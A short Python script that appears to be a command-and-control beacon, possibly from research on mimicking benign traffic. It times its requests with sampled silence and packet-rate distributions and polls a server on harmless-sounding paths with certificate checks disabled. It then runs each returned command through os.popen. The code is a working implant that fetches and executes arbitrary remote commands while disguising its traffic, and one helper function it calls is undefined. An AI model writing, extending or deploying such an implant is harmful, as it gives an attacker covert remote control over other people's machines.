import requests 
import os, shlex, subprocess
import urllib, urllib3
import random 
import numpy as np
#from dist import *
import time

# load silences 
silence_array = np.load("../stats/dist_weights/silence-ubuntu-social-adblock-17-may-alpha0_0.npy")
pps_array = np.load("../stats/dist_weights/pps-ubuntu-social-adblock-17-may-alpha-0_0.npy")
pktlen_array = np.load("../stats/dist_weights/silence-ubuntu-social-adblock-17-may-alpha0_0.npy")  ## #tt
server_address = "http://127.0.0.1:4440/" #"http://111.11.11.10:65321/"
print(pps_array)

def gen_pps():
    exit_loop = False
    val_pps = None
    while not exit_loop:
        val_pps = beta_negative_binomial(6.0, 3.3, 6, max=40)
        if val_pps >= 7:
            if random.uniform(0, 1) < 0.20:
                exit_loop = True
        else:
            if random.uniform(0, 1) >= 0.20:
                exit_loop = True
    return val_pps

def empirical_prob(pps_or_pktlen, silence_array=None, pps_array=None, pktlen_array=None):
    if pps_or_pktlen == "pps":
        return np.random.choice(list(range(np.size(pps_array))), size=None, replace=True, p=pps_array)
    if pps_or_pktlen == "silence":
        return np.random.choice(list(range(np.size(silence_array))), size=None, replace=True, p=silence_array)
    if pps_or_pktlen == "low_sil":
        return np.random.choice([600, 700, 800, 850, 900], size=None, p=[0.20, 0.20, 0.20, 0.20, 0.20]) #1 1111repor 3, 6...    
    else:
        return np.random.choice(list(range(np.size(pktlen_array))), size=None, replace=True, p=pktlen_array) 

while True:
    """ GET """
    time.sleep(empirical_prob("low_sil"))
    print("getting command")
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) ## we dont need to verify the certs for testing purposes...
    services = ["exploring", "network_status", "system_settings"]
    service = services[random.randint(0, len(services)-1)]
    message = server_address+service
    #'0:03'.format(len(service)+len(server_address))
    r = requests.get(message, verify=False)
    cmd_fetched = r.content.decode("utf-8")[1:-1] ## byte stream to str again and remove \"
    print("commdand: ", cmd_fetched)

    """ RUN COMMAND """
    stream_command = os.popen(cmd_fetched+" 2>&1")   #output_curl
    output_command = stream_command.read()

    print("command completed")
